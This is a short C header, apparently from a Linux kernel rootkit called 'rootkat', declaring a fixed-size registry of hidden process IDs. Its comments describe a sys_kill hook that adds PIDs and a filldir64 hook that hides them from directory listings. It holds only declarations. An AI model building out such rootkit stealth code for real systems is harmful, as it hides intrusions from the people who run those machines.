/* SPDX-License-Identifier: MIT */
#ifndef ROOTKAT_HIDDEN_PIDS_H
#define ROOTKAT_HIDDEN_PIDS_H

#include <linux/types.h>

/*
 * Tiny fixed-size hidden-PID registry. Mutated from process context
 * (sys_kill hook) and read from any context (filldir64 hook can run
 * on any CPU). Spinlock-protected; bounded iteration cost.
 */
#define ROOTKAT_HIDDEN_PIDS_MAX 16

void rootkat_hide_pid(pid_t pid);
void rootkat_unhide_pid(pid_t pid);
bool rootkat_is_pid_hidden(pid_t pid);

/* Convenience: parse name as a base-10 PID and check membership. */
bool rootkat_is_pid_name_hidden(const char *name, int namlen);

#endif
